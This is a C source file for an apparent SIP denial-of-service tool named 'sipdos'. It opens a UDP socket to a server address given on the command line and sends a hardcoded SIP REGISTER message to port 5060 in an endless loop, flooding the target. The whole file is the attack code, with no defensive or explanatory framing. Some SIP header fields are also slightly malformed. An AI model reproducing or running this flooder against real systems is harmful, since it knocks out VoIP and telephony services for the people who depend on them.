#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#define BUFFSIZE 1024

void Die(char *mess) { perror(mess); exit(1); }
  
char *message = "REGISTER sip:192.168.0.100:5060 SIP/2.0\n"
"Via: SIP/2.0/UDP 192.168.0.188;branch=z9hG4bKa4c6495f8\nTo: sipdos <sip:6000 at 192.168.0.100:5060>\n"
"From: sipdos <sip:6000 at 192.168.0.100:5060>;tag=e154d164425d784\nCall-ID: a917df615b074b81ea2ec43580799f6e@ 192.168.0.188\n"
"CSeq: 1219791964 REGISTER\nContact: sipdos <sip:6000@ 192.168.0.188>;expires=660\n"
"Allow: NOTIFY\nAllow: REFER\nAllow: OPTIONS\nAllow: INVITE\nAllow: ACK\nAllow: CANCEL\nAllow: BYE\n"
"Content-Length: 0\nUser-Agent: sipdos/1.5.0.0 MxSF/v3.2.5.20\n";

char *port = "5060";   /* SIP PORT */

  int main(int argc, char *argv[]) {
            int sock;
            struct sockaddr_in sipserver;
            struct sockaddr_in sipclient;
            char buffer[BUFFSIZE];
            unsigned int siplen, clientlen;
            int received = 0;
            char sipmsg;
            if (argc != 2) {
              fprintf(stderr, "Incorrect Arguments. Please use: %s <server_ip>\n", argv[0]);
              exit(1);
            }
           /* Create the UDP socket */
            if ((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
              Die("Failed to create socket");
            }
            /* Construct the server sockaddr_in structure */
            memset(&sipserver, 0, sizeof(sipserver));       /* zero out the structure */
            sipserver.sin_family = AF_INET;                  /* Internet/IP */
            sipserver.sin_addr.s_addr = inet_addr(argv[1]);  /* CLI passed IP address */
            sipserver.sin_port = htons(atoi(port));       /* server port hard coded for SIP */

  /* Build a continuous loop to send the message to the far end */
 while(1){
          siplen = strlen(message);
          if (sendto(sock, message, siplen, 0,
                     (struct sockaddr *) &sipserver,
                     sizeof(sipserver)) != siplen) {
            Die("Mismatch in number of sent bytes");
          }
      }
}

